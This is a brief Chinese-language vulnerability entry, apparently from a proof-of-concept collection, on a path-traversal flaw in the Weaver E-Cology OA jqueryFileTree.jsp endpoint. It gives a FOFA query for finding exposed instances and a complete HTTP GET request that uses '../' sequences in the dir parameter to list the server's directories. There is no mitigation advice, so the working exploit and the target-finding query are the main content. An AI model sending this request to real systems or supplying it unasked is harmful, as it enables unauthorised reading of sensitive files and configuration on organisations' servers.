## 泛微E Cology jqueryFileTree.jsp 路径穿越漏洞

## 漏洞描述
泛微 E Cology `jqueryFileTree.jsp` 接口在拼接文件路径时未限制 `..`，攻击者可遍历服务器文件系统，读取敏感配置或覆盖关键文件。

## 网络空间测绘
```
fofa: app="泛微-OA（e-cology）"
```

## POC
```
GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../../ HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2244.69 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

